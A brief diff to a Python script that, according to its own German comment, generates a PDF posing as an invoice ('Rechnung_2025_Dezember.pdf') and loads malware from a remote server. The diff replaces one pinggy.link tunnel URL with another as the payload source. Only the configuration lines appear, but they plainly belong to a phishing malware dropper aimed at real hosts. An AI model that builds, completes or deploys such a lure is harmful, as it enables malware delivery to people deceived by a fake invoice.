@@ -3,7 +3,7 @@ from fpdf import FPDF
 from PIL import Image, ImageDraw, ImageFont, ImageFilter
 
 # URL des Servers, von dem die Malware geladen werden soll
-PAYLOAD_URL = "https://ztkam-2003-c3-7f14-8700-7285-c2ff-fed9-c71d.a.free.pinggy.link/dokument_abrufen"
+PAYLOAD_URL = "https://bqqpu-217-234-53-148.a.free.pinggy.link/dokument_abrufen"
 OUTPUT_FILENAME = "Rechnung_2025_Dezember.pdf"
 
 
